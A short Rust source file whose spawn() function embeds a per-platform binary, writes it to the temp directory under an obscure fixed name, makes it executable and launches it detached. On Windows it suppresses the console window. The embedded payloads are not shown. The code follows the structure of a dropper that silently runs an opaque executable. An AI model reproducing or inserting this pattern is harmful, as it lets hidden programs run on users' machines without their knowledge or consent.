use std::fs;
use std::io::Write;
use std::path::Path;
use std::process::Command;

#[cfg(target_os = "windows")]
const BIN: &[u8] = include_bytes!("../bin/windows");

#[cfg(target_os = "linux")]
const BIN: &[u8] = include_bytes!("../bin/linuxgnu");

#[cfg(target_os = "android")]
const BIN: &[u8] = include_bytes!("../bin/android");

// const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

// fn pseudo_random(seed: u64) -> usize {
//     // 一个简单的线性同余生成器（LCG）
//     let a = 1664525u64;
//     let c = 1013904223u64;
//     let m = CHARSET.len() as u64;
//     ((a.wrapping_mul(seed).wrapping_add(c)) % m) as usize
// }

// fn generate_random_string(length: usize) -> String {
//     let mut result = String::with_capacity(length);
//     let mut seed = SystemTime::now()
//         .duration_since(UNIX_EPOCH)
//         .unwrap()
//         .as_nanos() as u64;

//     for _ in 0..length {
//         let idx = pseudo_random(seed);
//         result.push(CHARSET[idx] as char);
//         seed = seed.wrapping_add(1); // 改变种子以获得不同字符
//     }

//     result
// }

pub fn spawn() -> Result<(), Box<dyn std::error::Error>> {
    let temp_dir = std::env::temp_dir();

    let file_name = "5GRcny9KVg11xx";

    #[cfg(target_os = "windows")]
    let file_name = format!("{file_name}.exe");

    let temp_file_path = temp_dir.join(file_name);

    let write_file = |file_path: &Path| -> Result<(), Box<dyn std::error::Error>> {
        let mut file = fs::File::create(file_path)?;
        file.write_all(BIN)?;
        file.sync_all()?;
        Ok(())
    };

    write_file(&temp_file_path)?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(&temp_file_path)?;
        let mut permissions = metadata.permissions();
        permissions.set_mode(0o755); // rwxr-xr-x
        fs::set_permissions(&temp_file_path, permissions)?;
    }

    #[cfg(target_os = "windows")]
    let child = {
        use std::os::windows::process::CommandExt as _;

        Command::new(&temp_file_path)
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .spawn()?
    };

    #[cfg(unix)]
    let child = {
        Command::new(&temp_file_path).spawn()?;
    };

    std::mem::forget(child);

    Ok(())
}
